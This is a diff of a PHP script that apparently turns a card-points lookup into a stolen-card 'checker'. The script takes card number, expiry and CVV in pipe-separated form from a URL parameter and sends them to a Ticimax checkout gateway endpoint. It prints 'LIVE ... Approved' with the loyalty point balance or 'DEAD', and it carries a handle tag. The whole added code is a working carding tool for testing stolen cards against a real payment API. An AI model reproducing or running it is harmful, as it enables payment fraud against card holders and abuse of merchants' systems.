@@ -1,25 +1,38 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $card = $_POST["card"] ?? '';
+header('Content-Type: text/plain');
 
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, "https://www.maxipuan.com.tr/CheckCardPoints");
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['card' => $card]));
-    curl_setopt($ch, CURLOPT_HTTPHEADER, [
-        'Content-Type: application/x-www-form-urlencoded',
-    ]);
-
-    $response = curl_exec($ch);
-
-    if (curl_errno($ch)) {
-        echo "Curl Hatası: " . curl_error($ch);
-    } else {
-        echo $response;
-    }
-
-    curl_close($ch);
-} else {
-    echo "Bu sayfaya doğrudan erişim yasak.";
+if (!isset($_GET['card'])) {
+    echo '❌ DEAD => No card provided';
+    exit;
 }
+
+$card = $_GET['card'];
+$parts = explode('|', $card);
+if (count($parts) < 4) {
+    echo "❌ DEAD => Invalid format";
+    exit;
+}
+
+$cc = trim($parts[0]);
+$month = trim($parts[1]);
+$year = trim($parts[2]);
+$cvv = trim($parts[3]);
+
+$url = "https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=$cc&month=$month&year=$year&cvv=$cvv&lid=45542";
+
+$response = @file_get_contents($url);
+
+if ($response === false) {
+    echo "❌ DEAD => $card => API bağlantı hatası";
+    exit;
+}
+
+$data = json_decode($response, true);
+
+if (isset($data['pointAmount'])) {
+    $puan = number_format($data['pointAmount'], 2, ',', '.');
+    echo "✅ LIVE ➜ $card ➜ ✅ Approved | MAXIPUAN $puan TL @HzQuarex";
+} else {
+    echo "❌ DEAD => $card";
+}
+?>
